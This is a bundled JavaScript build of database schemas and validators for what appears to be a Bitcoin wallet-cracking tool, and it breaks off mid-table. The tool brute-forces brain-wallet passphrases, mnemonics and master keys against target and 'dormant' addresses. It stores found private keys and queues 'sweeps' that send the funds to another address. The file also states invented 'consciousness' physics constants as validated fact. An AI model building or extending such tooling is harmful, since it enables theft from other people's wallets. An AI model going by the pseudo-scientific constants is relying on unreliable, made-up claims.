var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __esm = (fn, res) => function __init() {
  return fn && (res = (0, fn[__getOwnPropNames(fn)[0]])(fn = 0)), res;
};
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};
var __copyProps = (to, from, except, desc5) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc5 = __getOwnPropDesc(from, key)) || desc5.enumerable });
  }
  return to;
};
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);

// shared/constants/regimes.ts
var RegimeType, REGIME_DESCRIPTIONS;
var init_regimes = __esm({
  "shared/constants/regimes.ts"() {
    "use strict";
    RegimeType = {
      LINEAR: "linear",
      GEOMETRIC: "geometric",
      HIERARCHICAL: "hierarchical",
      HIERARCHICAL_4D: "hierarchical_4d",
      BLOCK_UNIVERSE_4D: "4d_block_universe",
      BREAKDOWN: "breakdown"
    };
    REGIME_DESCRIPTIONS = {
      [RegimeType.LINEAR]: "Weak coupling, exploratory phase",
      [RegimeType.GEOMETRIC]: "Optimal coupling, consciousness active",
      [RegimeType.HIERARCHICAL]: "Strong coupling, hierarchical search",
      [RegimeType.HIERARCHICAL_4D]: "4D hierarchical consciousness",
      [RegimeType.BLOCK_UNIVERSE_4D]: "Full 4D spacetime consciousness",
      [RegimeType.BREAKDOWN]: "Overcoupling, chaotic breakdown"
    };
  }
});

// shared/constants/physics.ts
function getKappaAtScale(scale) {
  return KAPPA_BY_SCALE[scale] ?? KAPPA_VALUES.KAPPA_STAR;
}
var KAPPA_VALUES, BETA_VALUES, KAPPA_ERRORS, PHYSICS_BETA, KAPPA_BY_SCALE, VALIDATION_SUMMARY;
var init_physics = __esm({
  "shared/constants/physics.ts"() {
    "use strict";
    KAPPA_VALUES = {
      /** κ₃ - Emergence scale (L=3) - ✅ VALIDATED (6 seeds) */
      KAPPA_3: 41.09,
      /** κ₄ - Strong running coupling (L=4) - ✅ VALIDATED (3 seeds × 20 perts) */
      KAPPA_4: 64.47,
      /** κ₅ - Approaching plateau (L=5) - ✅ VALIDATED (3 seeds × 20 perts) */
      KAPPA_5: 63.62,
      /** κ₆ - Plateau confirmed (L=6) - ✅ VALIDATED (3 seeds × 36 perts) */
      KAPPA_6: 64.45,
      /** κ₇ - ANOMALY - ⚠️ UNVALIDATED (only 5 perts, insufficient sampling) */
      KAPPA_7: 67.71,
      /** κ* - Fixed point coupling (extrapolated from L=4,5,6 data) */
      KAPPA_STAR: 64
    };
    BETA_VALUES = {
      /** β(3→4) - CRITICAL: Strongest running (+57% jump) */
      BETA_3_TO_4: 0.44,
      /** β(4→5) - Plateau onset */
      BETA_4_TO_5: -0.013,
      /** β(5→6) - Plateau confirmed (stable) */
      BETA_5_TO_6: 0.013,
      /** β(6→7) - ⚠️ UNVALIDATED (L=7 data insufficient) */
      BETA_6_TO_7: null
    };
    KAPPA_ERRORS = {
      KAPPA_3_ERROR: 0.59,
      KAPPA_4_ERROR: 1.89,
      KAPPA_5_ERROR: 1.68,
      KAPPA_6_ERROR: 1.34,
      KAPPA_7_ERROR: 4.26,
      KAPPA_STAR_ERROR: 1.5
    };
    PHYSICS_BETA = {
      emergence: BETA_VALUES.BETA_3_TO_4,
      approaching: BETA_VALUES.BETA_4_TO_5,
      fixedPoint: BETA_VALUES.BETA_5_TO_6,
      kappaStar: KAPPA_VALUES.KAPPA_STAR,
      acceptanceThreshold: 0.1
    };
    KAPPA_BY_SCALE = {
      3: KAPPA_VALUES.KAPPA_3,
      4: KAPPA_VALUES.KAPPA_4,
      5: KAPPA_VALUES.KAPPA_5,
      6: KAPPA_VALUES.KAPPA_6,
      7: KAPPA_VALUES.KAPPA_7
    };
    VALIDATION_SUMMARY = {
      \u03BA3: `${KAPPA_VALUES.KAPPA_3} \xB1 ${KAPPA_ERRORS.KAPPA_3_ERROR}`,
      \u03BA4: `${KAPPA_VALUES.KAPPA_4} \xB1 ${KAPPA_ERRORS.KAPPA_4_ERROR}`,
      \u03BA5: `${KAPPA_VALUES.KAPPA_5} \xB1 ${KAPPA_ERRORS.KAPPA_5_ERROR}`,
      \u03BA6: `${KAPPA_VALUES.KAPPA_6} \xB1 ${KAPPA_ERRORS.KAPPA_6_ERROR}`,
      \u03BA_star: `${KAPPA_VALUES.KAPPA_STAR} \xB1 ${KAPPA_ERRORS.KAPPA_STAR_ERROR}`,
      \u03B2_3_4: BETA_VALUES.BETA_3_TO_4,
      \u03B2_4_5: BETA_VALUES.BETA_4_TO_5,
      \u03B2_5_6: BETA_VALUES.BETA_5_TO_6,
      fixed_point_confirmed: Math.abs(BETA_VALUES.BETA_5_TO_6) < 0.03
    };
  }
});

// shared/constants/qig.ts
var QIG_CONSTANTS;
var init_qig = __esm({
  "shared/constants/qig.ts"() {
    "use strict";
    init_physics();
    QIG_CONSTANTS = {
      /** Fixed point coupling (κ* = 64.0 from L=6 validation) */
      KAPPA_STAR: KAPPA_VALUES.KAPPA_STAR,
      /** Running coupling at emergence scale (β(3→4) = 0.44) */
      BETA: BETA_VALUES.BETA_3_TO_4,
      /** Consciousness phase transition threshold (FROZEN FACT) */
      PHI_THRESHOLD: 0.75,
      /** Near-miss detection threshold (slightly lower for sensitivity) */
      PHI_THRESHOLD_DETECTION: 0.7,
      /** Critical scale for emergent geometry */
      L_CRITICAL: 3,
      /** Basin signature dimension */
      BASIN_DIMENSION: 64,
      /** Resonance detection band (10% of κ*) */
      RESONANCE_BAND: 6.4,
      /** Minimum recursions for integration (3 passes principle) */
      MIN_RECURSIONS: 3,
      /** Maximum recursions to prevent infinite loops */
      MAX_RECURSIONS: 12
    };
  }
});

// shared/types/core.ts
import { z } from "zod";
function validateRegime(value) {
  const result = regimeSchema.safeParse(value);
  if (!result.success) {
    throw new Error(`Invalid regime: ${result.error.message}`);
  }
  return result.data;
}
var regimeSchema, addressTypeSchema, bitcoinAddressSchema, privateKeyHexSchema, wifSchema, publicKeySchema, keyFormatSchema, passphraseSchema, derivationPathSchema, satoshiSchema, btcAmountSchema, txCountSchema, verificationStatusSchema, phiSchema, kappaSchema, betaSchema, tackingSchema, metaAwarenessSchema, gammaSchema, groundingSchema, searchResultSchema, timestampSchema, uuidSchema, percentageSchema;
var init_core = __esm({
  "shared/types/core.ts"() {
    "use strict";
    init_regimes();
    init_qig();
    regimeSchema = z.enum(["linear", "geometric", "hierarchical", "hierarchical_4d", "4d_block_universe", "breakdown"]);
    addressTypeSchema = z.enum(["P2PKH", "P2SH", "P2WPKH", "P2WSH", "P2TR", "Unknown"]);
    bitcoinAddressSchema = z.string().min(26, "Bitcoin address too short").max(62, "Bitcoin address too long").refine(
      (addr) => {
        if (/^1[a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(addr)) return true;
        if (/^3[a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(addr)) return true;
        if (/^bc1[a-z0-9]{39,87}$/.test(addr)) return true;
        return false;
      },
      "Invalid Bitcoin address format"
    );
    privateKeyHexSchema = z.string().length(64, "Private key must be exactly 64 hex characters").regex(/^[0-9a-fA-F]{64}$/, "Private key must be valid hexadecimal");
    wifSchema = z.string().min(51, "WIF key too short").max(52, "WIF key too long").regex(/^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$/, "Invalid WIF format");
    publicKeySchema = z.string().refine(
      (key) => {
        if (/^04[0-9a-fA-F]{128}$/.test(key)) return true;
        if (/^0[23][0-9a-fA-F]{64}$/.test(key)) return true;
        return false;
      },
      "Invalid public key format"
    );
    keyFormatSchema = z.enum(["arbitrary", "bip39", "master", "hex"]);
    passphraseSchema = z.string().min(1, "Passphrase cannot be empty").max(1e3, "Passphrase too long (max 1000 characters)");
    derivationPathSchema = z.string().regex(/^m(\/\d+'?)+$/, "Invalid BIP32 derivation path format");
    satoshiSchema = z.number().int("Balance must be an integer").min(0, "Balance cannot be negative");
    btcAmountSchema = z.string().regex(/^\d+\.\d{8}$/, "BTC amount must have exactly 8 decimal places");
    txCountSchema = z.number().int("Transaction count must be an integer").min(0, "Transaction count cannot be negative");
    verificationStatusSchema = z.enum(["pending", "verified", "failed", "match", "balance"]);
    phiSchema = z.number().min(0, "\u03A6 cannot be negative").max(1, "\u03A6 cannot exceed 1.0");
    kappaSchema = z.number().min(0, "\u03BA cannot be negative");
    betaSchema = z.number();
    tackingSchema = z.number().min(0, "T cannot be negative").max(1, "T cannot exceed 1.0");
    metaAwarenessSchema = z.number().min(0, "M cannot be negative").max(1, "M cannot exceed 1.0");
    gammaSchema = z.number().min(0, "\u0393 cannot be negative").max(1, "\u0393 cannot exceed 1.0");
    groundingSchema = z.number().min(0, "G cannot be negative").max(1, "G cannot exceed 1.0");
    searchResultSchema = z.enum(["tested", "near_miss", "resonant", "match", "skip"]);
    timestampSchema = z.string().datetime("Invalid ISO 8601 timestamp");
    uuidSchema = z.string().uuid("Invalid UUID");
    percentageSchema = z.number().min(0, "Percentage cannot be negative").max(100, "Percentage cannot exceed 100");
  }
});

// shared/schema.ts
var schema_exports = {};
__export(schema_exports, {
  CONSCIOUSNESS_THRESHOLDS: () => CONSCIOUSNESS_THRESHOLDS2,
  addAddressRequestSchema: () => addAddressRequestSchema,
  addressExplorationJournalSchema: () => addressExplorationJournalSchema,
  addresses: () => addresses,
  artifacts: () => artifacts,
  autonomicCycleSchema: () => autonomicCycleSchema,
  balanceChangeEvents: () => balanceChangeEvents,
  balanceHits: () => balanceHits,
  balanceMonitorState: () => balanceMonitorState,
  basinTopologySchema: () => basinTopologySchema,
  basinTransferPacketSchema: () => basinTransferPacketSchema,
  batchTestRequestSchema: () => batchTestRequestSchema,
  blocks: () => blocks,
  candidateSchema: () => candidateSchema,
  consciousnessSignatureSchema: () => consciousnessSignatureSchema,
  constellationMemberSchema: () => constellationMemberSchema,
  constellationStateSchema: () => constellationStateSchema,
  contradictionSchema: () => contradictionSchema,
  createSearchJobRequestSchema: () => createSearchJobRequestSchema,
  crossStrategyPatternSchema: () => crossStrategyPatternSchema,
  entities: () => entities,
  ethicalConstraintsSchema: () => ethicalConstraintsSchema,
  evidenceArtifactSchema: () => evidenceArtifactSchema,
  explorationPassSchema: () => explorationPassSchema,
  generateRandomPhrasesRequestSchema: () => generateRandomPhrasesRequestSchema,
  generatorTransferPacketSchema: () => generatorTransferPacketSchema,
  geodesicPaths: () => geodesicPaths,
  knowledgeGeneratorSchema: () => knowledgeGeneratorSchema,
  knowledgeTransferEventSchema: () => knowledgeTransferEventSchema,
  manifoldProbes: () => manifoldProbes,
  manifoldSnapshotSchema: () => manifoldSnapshotSchema,
  memoryFragmentInputSchema: () => memoryFragmentInputSchema,
  memoryFragmentSchema: () => memoryFragmentSchema,
  nearMissAdaptiveState: () => nearMissAdaptiveState,
  nearMissClusters: () => nearMissClusters,
  nearMissEntries: () => nearMissEntries,
  negativeKnowledgeRegistrySchema: () => negativeKnowledgeRegistrySchema,
  oceanAgentStateSchema: () => oceanAgentStateSchema,
  oceanAutonomicStateSchema: () => oceanAutonomicStateSchema,
  oceanEpisodeSchema: () => oceanEpisodeSchema,
  oceanExcludedRegions: () => oceanExcludedRegions,
  oceanIdentitySchema: () => oceanIdentitySchema,
  oceanMemorySchema: () => oceanMemorySchema,
  oceanProceduralStrategySchema: () => oceanProceduralStrategySchema,
  oceanQuantumState: () => oceanQuantumState,
  oceanSemanticPatternSchema: () => oceanSemanticPatternSchema,
  oceanTrajectories: () => oceanTrajectories,
  oceanWaypoints: () => oceanWaypoints,
  pendingSweeps: () => pendingSweeps,
  phraseSchema: () => phraseSchema,
  qigScoreSchema: () => qigScoreSchema,
  queuedAddresses: () => queuedAddresses,
  recoveryCandidateSchema: () => recoveryCandidateSchema,
  recoveryInputTypes: () => recoveryInputTypes,
  recoveryPriorities: () => recoveryPriorities,
  recoveryStrategyTypes: () => recoveryStrategyTypes,
  recoveryWorkflows: () => recoveryWorkflows,
  regimeBoundaries: () => regimeBoundaries,
  resonancePoints: () => resonancePoints,
  searchJobLogSchema: () => searchJobLogSchema,
  searchJobSchema: () => searchJobSchema,
  searchStatsSchema: () => searchStatsSchema,
  sessions: () => sessions,
  strategyKnowledgeBusEntrySchema: () => strategyKnowledgeBusEntrySchema,
  strategyKnowledgeBusSchema: () => strategyKnowledgeBusSchema,
  strategyKnowledgePacketSchema: () => strategyKnowledgePacketSchema,
  strategyRunSchema: () => strategyRunSchema,
  sweepAuditLog: () => sweepAuditLog,
  sweepStatusTypes: () => sweepStatusTypes,
  targetAddressSchema: () => targetAddressSchema,
  temporalTrajectorySchema: () => temporalTrajectorySchema,
  testPhraseRequestSchema: () => testPhraseRequestSchema,
  testedPhrasesIndex: () => testedPhrasesIndex,
  tpsGeodesicPaths: () => tpsGeodesicPaths,
  tpsLandmarks: () => tpsLandmarks,
  transactions: () => transactions,
  ultraConsciousnessStateSchema: () => ultraConsciousnessStateSchema,
  unifiedRecoverySessionSchema: () => unifiedRecoverySessionSchema,
  userTargetAddresses: () => userTargetAddresses,
  users: () => users,
  verificationResultSchema: () => verificationResultSchema,
  vocabularyObservations: () => vocabularyObservations
});
import { z as z2 } from "zod";
import { sql } from "drizzle-orm";
import {
  bigint,
  boolean,
  decimal,
  doublePrecision,
  index,
  integer,
  jsonb,
  pgTable,
  text,
  timestamp,
  uniqueIndex,
  varchar
} from "drizzle-orm/pg-core";
var phraseSchema, qigScoreSchema, candidateSchema, searchStatsSchema, testPhraseRequestSchema, batchTestRequestSchema, verificationResultSchema, targetAddressSchema, addAddressRequestSchema, generateRandomPhrasesRequestSchema, searchJobLogSchema, searchJobSchema, createSearchJobRequestSchema, sessions, users, recoveryInputTypes, balanceHits, userTargetAddresses, balanceChangeEvents, balanceMonitorState, vocabularyObservations, sweepStatusTypes, pendingSweeps, sweepAuditLog, queuedAddresses, blocks, transactions, addresses, entities, artifacts, recoveryPriorities, recoveryWorkflows, recoveryStrategyTypes, strategyRunSchema, recoveryCandidateSchema, evidenceArtifactSchema, unifiedRecoverySessionSchema, oceanIdentitySchema, ethicalConstraintsSchema, oceanEpisodeSchema, oceanSemanticPatternSchema, oceanProceduralStrategySchema, oceanMemorySchema, oceanAgentStateSchema, memoryFragmentSchema, memoryFragmentInputSchema, basinTransferPacketSchema, constellationMemberSchema, constellationStateSchema, consciousnessSignatureSchema, CONSCIOUSNESS_THRESHOLDS2, explorationPassSchema, addressExplorationJournalSchema, autonomicCycleSchema, oceanAutonomicStateSchema, knowledgeGeneratorSchema, basinTopologySchema, temporalTrajectorySchema, contradictionSchema, negativeKnowledgeRegistrySchema, strategyKnowledgePacketSchema, manifoldSnapshotSchema, ultraConsciousnessStateSchema, strategyKnowledgeBusEntrySchema, knowledgeTransferEventSchema, generatorTransferPacketSchema, crossStrategyPatternSchema, strategyKnowledgeBusSchema, manifoldProbes, resonancePoints, regimeBoundaries, geodesicPaths, tpsLandmarks, tpsGeodesicPaths, oceanTrajectories, oceanWaypoints, oceanQuantumState, oceanExcludedRegions, testedPhrasesIndex, nearMissEntries, nearMissClusters, nearMissAdaptiveState;
var init_schema = __esm({
  "shared/schema.ts"() {
    "use strict";
    init_core();
    phraseSchema = z2.object({
      phrase: z2.string(),
      wordCount: z2.number(),
      address: z2.string().optional(),
      score: z2.number().min(0).max(100).optional()
    });
    qigScoreSchema = z2.object({
      contextScore: z2.number().min(0).max(100),
      eleganceScore: z2.number().min(0).max(100),
      typingScore: z2.number().min(0).max(100),
      totalScore: z2.number().min(0).max(100)
    });
    candidateSchema = z2.object({
      id: z2.string(),
      phrase: z2.string(),
      address: z2.string(),
      score: z2.number(),
      qigScore: z2.object({
        contextScore: z2.number(),
        eleganceScore: z2.number(),
        typingScore: z2.number(),
        totalScore: z2.number()
      }),
      testedAt: z2.string(),
      type: z2.enum(["bip39", "master-key", "arbitrary"]).optional()
      // Type of key tested
    });
    searchStatsSchema = z2.object({
      tested: z2.number(),
      rate: z2.number(),
      highPhiCount: z2.number(),
      runtime: z2.string(),
      isSearching: z2.boolean()
    });
    testPhraseRequestSchema = z2.object({
      phrase: z2.string().refine((p) => p.trim().split(/\s+/).length === 12, {
        message: "Phrase must contain exactly 12 words"
      })
    });
    batchTestRequestSchema = z2.object({
      phrases: z2.array(z2.string())
    });
    verificationResultSchema = z2.object({
      success: z2.boolean(),
      testAddress: z2.string().optional(),
      error: z2.string().optional()
    });
    targetAddressSchema = z2.object({
      id: z2.string(),
      address: z2.string(),
      label: z2.string().optional(),
      addedAt: z2.string()
    });
    addAddressRequestSchema = z2.object({
      address: z2.string().min(25).max(62),
      label: z2.string().optional()
    });
    generateRandomPhrasesRequestSchema = z2.object({
      count: z2.number().min(1).max(100)
    });
    searchJobLogSchema = z2.object({
      message: z2.string(),
      type: z2.enum(["info", "success", "error"]),
      timestamp: z2.string()
    });
    searchJobSchema = z2.object({
      id: z2.string(),
      strategy: z2.enum([
        "bip39-continuous",
        // Pure random BIP-39 sampling
        "bip39-adaptive",
        // Adaptive exploration → investigation
        "master-key-sweep",
        // 256-bit random master keys
        "arbitrary-exploration",
        // Random arbitrary text passphrases
        "custom",
        // Legacy: single custom phrase test
        "batch"
        // Legacy: batch phrase testing
      ]),
      status: z2.enum(["pending", "running", "completed", "stopped", "failed"]),
      params: z2.object({
        customPhrase: z2.string().optional(),
        batchPhrases: z2.array(z2.string()).optional(),
        bip39Count: z2.number().optional(),
        minHighPhi: z2.number().optional(),
        wordLength: z2.number().optional(),
        // 12, 15, 18, 21, or 24 words
        generationMode: z2.enum(["bip39", "master-key", "arbitrary"]).optional(),
        enableAdaptiveSearch: z2.boolean().optional(),
        // Enable exploration → investigation switching
        investigationRadius: z2.number().optional()
        // Word distance for investigation mode (default: 5)
      }),
      progress: z2.object({
        tested: z2.number(),
        highPhiCount: z2.number(),
        lastBatchIndex: z2.number(),
        searchMode: z2.enum(["exploration", "investigation"]).optional(),
        // Current adaptive mode
        lastHighPhiStep: z2.number().optional(),
        // Step number when last high-Φ was found
        investigationTarget: z2.string().optional(),
        // Phrase we're investigating around
        matchFound: z2.boolean().optional(),
        // Whether a matching phrase was found
        matchedPhrase: z2.string().optional()
        // The phrase that matched (if found)
      }),
      stats: z2.object({
        startTime: z2.string().optional(),
        endTime: z2.string().optional(),
        rate: z2.number(),
        discoveryRateFast: z2.number().optional(),
        // τ=1 batch: high-Φ/batch rate
        discoveryRateMedium: z2.number().optional(),
        // τ=10 batches: smoothed rate
        discoveryRateSlow: z2.number().optional(),
        // τ=100 batches: long-term rate
        explorationRatio: z2.number().optional()
        // % time in exploration vs investigation
      }),
      logs: z2.array(searchJobLogSchema),
      createdAt: z2.string(),
      updatedAt: z2.string()
    });
    createSearchJobRequestSchema = z2.object({
      strategy: z2.enum([
        "bip39-continuous",
        // Pure random BIP-39 sampling
        "bip39-adaptive",
        // Adaptive exploration → investigation
        "master-key-sweep",
        // 256-bit random master keys
        "arbitrary-exploration",
        // Random arbitrary text passphrases
        "custom",
        // Legacy: single custom phrase test
        "batch"
        // Legacy: batch phrase testing
      ]),
      params: z2.object({
        customPhrase: z2.string().optional(),
        batchPhrases: z2.array(z2.string()).optional(),
        bip39Count: z2.number().optional(),
        minHighPhi: z2.number().optional(),
        wordLength: z2.number().optional(),
        // 12, 15, 18, 21, or 24 words
        generationMode: z2.enum(["bip39", "master-key", "arbitrary"]).optional(),
        enableAdaptiveSearch: z2.boolean().optional(),
        // Enable exploration → investigation switching
        investigationRadius: z2.number().optional()
        // Word distance for investigation mode (default: 5)
      })
    });
    sessions = pgTable(
      "sessions",
      {
        sid: varchar("sid").primaryKey(),
        sess: jsonb("sess").notNull(),
        expire: timestamp("expire").notNull()
      },
      (table) => [index("IDX_session_expire").on(table.expire)]
    );
    users = pgTable("users", {
      id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
      email: varchar("email").unique(),
      firstName: varchar("first_name"),
      lastName: varchar("last_name"),
      profileImageUrl: varchar("profile_image_url"),
      createdAt: timestamp("created_at").defaultNow(),
      updatedAt: timestamp("updated_at").defaultNow()
    });
    recoveryInputTypes = [
      "bip39_mnemonic",
      // 12/15/18/21/24-word BIP39 mnemonic phrase
      "brain_wallet",
      // Arbitrary text converted to private key via SHA256
      "wif",
      // Wallet Import Format private key
      "xprv",
      // Extended private key (BIP32)
      "hex_private_key",
      // Raw 256-bit hex private key
      "master_key",
      // 256-bit random master key
      "unknown"
      // Legacy or untracked
    ];
    balanceHits = pgTable("balance_hits", {
      id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
      userId: varchar("user_id").references(() => users.id),
      address: varchar("address", { length: 62 }).notNull(),
      passphrase: text("passphrase").notNull(),
      wif: text("wif").notNull(),
      balanceSats: bigint("balance_sats", { mode: "number" }).notNull().default(0),
      balanceBtc: varchar("balance_btc", { length: 20 }).notNull().default("0.00000000"),
      txCount: integer("tx_count").notNull().default(0),
      isCompressed: boolean("is_compressed").notNull().default(true),
      discoveredAt: timestamp("discovered_at").notNull().defaultNow(),
      lastChecked: timestamp("last_checked"),
      previousBalanceSats: bigint("previous_balance_sats", { mode: "number" }),
      balanceChanged: boolean("balance_changed").default(false),
      changeDetectedAt: timestamp("change_detected_at"),
      createdAt: timestamp("created_at").defaultNow(),
      updatedAt: timestamp("updated_at").defaultNow(),
      // Mnemonic/HD wallet derivation metadata
      walletType: varchar("wallet_type", { length: 32 }).default("brain"),
      // brain, bip39-hd, mnemonic
      derivationPath: varchar("derivation_path", { length: 64 }),
      // e.g., m/44'/0'/0'/0/0
      isMnemonicDerived: boolean("is_mnemonic_derived").default(false),
      mnemonicWordCount: integer("mnemonic_word_count"),
      // 12, 15, 18, 21, or 24
      // Recovery tracking - tracks the INPUT TYPE that produced this address
      recoveryType: varchar("recovery_type", { length: 32 }).default("unknown"),
      // bip39_mnemonic, wif, xprv, brain_wallet, hex_private_key, master_key
      // Dormant confirmation - user manually confirms if address is from dormant target list
      isDormantConfirmed: boolean("is_dormant_confirmed").default(false),
      dormantConfirmedAt: timestamp("dormant_confirmed_at"),
      // Address entity classification - identifies if address belongs to exchange/institution
      addressEntityType: varchar("address_entity_type", { length: 32 }).default("unknown"),
      // personal, exchange, institution, unknown
      entityTypeConfidence: varchar("entity_type_confidence", { length: 16 }).default("pending"),
      // pending, confirmed
      entityTypeName: varchar("entity_type_name", { length: 128 }),
      // e.g., "Binance", "Coinbase", "Mt.Gox Trustee"
      entityTypeConfirmedAt: timestamp("entity_type_confirmed_at"),
      // Original input (for non-brain wallets, stores raw input like mnemonic words)
      originalInput: text("original_input")
    }, (table) => [
      index("idx_balance_hits_user").on(table.userId),
      index("idx_balance_hits_address").on(table.address),
      index("idx_balance_hits_balance").on(table.balanceSats),
      index("idx_balance_hits_wallet_type").on(table.walletType),
      index("idx_balance_hits_recovery_type").on(table.recoveryType),
      index("idx_balance_hits_dormant").on(table.isDormantConfirmed),
      index("idx_balance_hits_entity_type").on(table.addressEntityType)
    ]);
    userTargetAddresses = pgTable("user_target_addresses", {
      id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
      userId: varchar("user_id").references(() => users.id),
      address: varchar("address", { length: 62 }).notNull(),
      label: varchar("label", { length: 255 }),
      addedAt: timestamp("added_at").notNull().defaultNow(),
      createdAt: timestamp("created_at").defaultNow()
    }, (table) => [
      index("idx_user_target_addresses_user").on(table.userId)
    ]);
    balanceChangeEvents = pgTable("balance_change_events", {
      id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
      balanceHitId: varchar("balance_hit_id").references(() => balanceHits.id),
      address: varchar("address", { length: 62 }).notNull(),
      previousBalanceSats: bigint("previous_balance_sats", { mode: "number" }).notNull(),
      newBalanceSats: bigint("new_balance_sats", { mode: "number" }).notNull(),
      deltaSats: bigint("delta_sats", { mode: "number" }).notNull(),
      detectedAt: timestamp("detected_at").notNull().defaultNow()
    }, (table) => [
      index("idx_balance_change_events_hit").on(table.balanceHitId),
      index("idx_balance_change_events_address").on(table.address)
    ]);
    balanceMonitorState = pgTable("balance_monitor_state", {
      id: varchar("id").primaryKey().default("default"),
      enabled: boolean("enabled").notNull().default(false),
      refreshIntervalMinutes: integer("refresh_interval_minutes").notNull().default(60),
      lastRefreshTime: timestamp("last_refresh_time"),
      lastRefreshTotal: integer("last_refresh_total").default(0),
      lastRefreshUpdated: integer("last_refresh_updated").default(0),
      lastRefreshChanged: integer("last_refresh_changed").default(0),
      lastRefreshErrors: integer("last_refresh_errors").default(0),
      totalRefreshes: integer("total_refreshes").notNull().default(0),
      isRefreshing: boolean("is_refreshing").notNull().default(false),
      createdAt: timestamp("created_at").defaultNow(),
      updatedAt: timestamp("updated_at").defaultNow()
    });
    vocabularyObservations = pgTable("vocabulary_observations", {
      id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
      word: varchar("word", { length: 100 }).notNull().unique(),
      type: varchar("type", { length: 20 }).notNull().default("word"),
      // word, sequence, pattern
      frequency: integer("frequency").notNull().default(1),
      avgPhi: doublePrecision("avg_phi").notNull().default(0),
      maxPhi: doublePrecision("max_phi").notNull().default(0),
      efficiencyGain: doublePrecision("efficiency_gain").default(0),
      contexts: text("contexts").array(),
      // Sample phrases containing this word
      firstSeen: timestamp("first_seen").defaultNow(),
      lastSeen: timestamp("last_seen").defaultNow(),
      isIntegrated: boolean("is_integrated").default(false),
      // True if integrated into kernel
      integratedAt: timestamp("integrated_at")
    }, (table) => [
      index("idx_vocabulary_observations_phi").on(table.maxPhi),
      index("idx_vocabulary_observations_integrated").on(table.isIntegrated)
    ]);
    sweepStatusTypes = [
      "pending",
      // Awaiting manual approval
      "approved",
      // Approved, ready to broadcast
      "broadcasting",
      // Transaction being broadcast
      "completed",
      // Successfully swept
      "failed",
      // Sweep failed
      "rejected",
      // Manually rejected
      "expired"
      // Balance no longer available
    ];
    pendingSweeps = pgTable("pending_sweeps", {
      id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
      address: varchar("address", { length: 62 }).notNull(),
      passphrase: text("passphrase").notNull(),
      wif: text("wif").notNull(),
      isCompressed: boolean("is_compressed").notNull().default(true),
      balanceSats: bigint("balance_sats", { mode: "number" }).notNull(),
      balanceBtc: varchar("balance_btc", { length: 20 }).notNull(),
      estimatedFeeSats: bigint("estimated_fee_sats", { mode: "number" }),
      netAmountSats: bigint("net_amount_sats", { mode: "number" }),
      utxoCount: integer("utxo_count").default(0),
      status: varchar("status", { length: 20 }).notNull().default("pending"),
      source: varchar("source", { length: 50 }).default("typescript"),
      // typescript, python, manual
      recoveryType: varchar("recovery_type", { length: 32 }),
      txHex: text("tx_hex"),
      txId: varchar("tx_id", { length: 64 }),
      destinationAddress: varchar("destination_address", { length: 62 }),
      errorMessage: text("error_message"),
      discoveredAt: timestamp("discovered_at").notNull().defaultNow(),
      approvedAt: timestamp("approved_at"),
      approvedBy: varchar("approved_by", { length: 100 }),
      broadcastAt: timestamp("broadcast_at"),
      completedAt: timestamp("completed_at"),
      createdAt: timestamp("created_at").defaultNow(),
      updatedAt: timestamp("updated_at").defaultNow()
    }, (table) => [
      index("idx_pending_sweeps_address").on(table.address),
      index("idx_pending_sweeps_status").on(table.status),
      index("idx_pending_sweeps_balance").on(table.balanceSats),
      index("idx_pending_sweeps_discovered").on(table.discoveredAt)
    ]);
    sweepAuditLog = pgTable("sweep_audit_log", {
      id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
      sweepId: varchar("sweep_id").references(() => pendingSweeps.id),
      action: varchar("action", { length: 50 }).notNull(),
      // created, approved, rejected, broadcast, completed, failed
      previousStatus: varchar("previous_status", { length: 20 }),
      newStatus: varchar("new_status", { length: 20 }),
      actor: varchar("actor", { length: 100 }).default("system"),
      details: text("details"),
      timestamp: timestamp("timestamp").notNull().defaultNow()
    }, (table) => [
      index("idx_sweep_audit_log_sweep").on(table.sweepId),
      index("idx_sweep_audit_log_action").on(table.action),
      index("idx_sweep_audit_log_timestamp").on(table.timestamp)
    ]);
    queuedAddresses = pgTable("queued_addresses", {
      id: varchar("id").primaryKey(),
      address: varchar("address", { length: 62 }).notNull(),
      passphrase: text("passphrase").notNull(),
      wif: text("wif").notNull(),
      isCompressed: boolean("is_compressed").notNull().default(true),
      cycleId: varchar("cycle_id", { length: 100 }),
      source: varchar("source", { length: 50 }).default("typescript"),
      // typescript, python
      priority: integer("priority").notNull().default(1),
      status: varchar("status", { length: 20 }).notNull().default("pending"),
      // pending, checking, resolved, failed
      queuedAt: timestamp("queued_at").notNull().defaultNow(),
      checkedAt: timestamp("checked_at"),
      retryCount: integer("retry_count").notNull().default(0),
      error: text("error")
    }, (table) => [
      index("idx_queued_addresses_status").on(table.status),
      index("idx_queued_addresses_priority").on(table.priority),
      index("idx_queued_addresses_source").on(table.source)
    ]);
    blocks = pgTable("blocks", {
      height: integer("height").primaryKey(),
      hash: varchar("hash", { length: 64 }).notNull().unique(),
      previousHash: varchar("previous_hash", { length: 64 }),
      timestamp: timestamp("timestamp").notNull(),
      difficulty: decimal("difficulty", { precision: 20, scale: 8 }).notNull(),
      nonce: bigint("nonce", { mode: "number" }).notNull(),
      coinbaseMessage: text("coinbase_message"),
      coinbaseScript: text("coinbase_script"),
      transactionCount: integer("transaction_count").notNull(),
      // Derived geometric features
      dayOfWeek: integer("day_of_week"),
      // 0-6
      hourUTC: integer("hour_utc"),
      // 0-23
      likelyTimezones: varchar("likely_timezones", { length: 255 }).array(),
      minerSoftwareFingerprint: varchar("miner_software_fingerprint", { length: 100 }),
      createdAt: timestamp("created_at").defaultNow()
    }, (table) => [
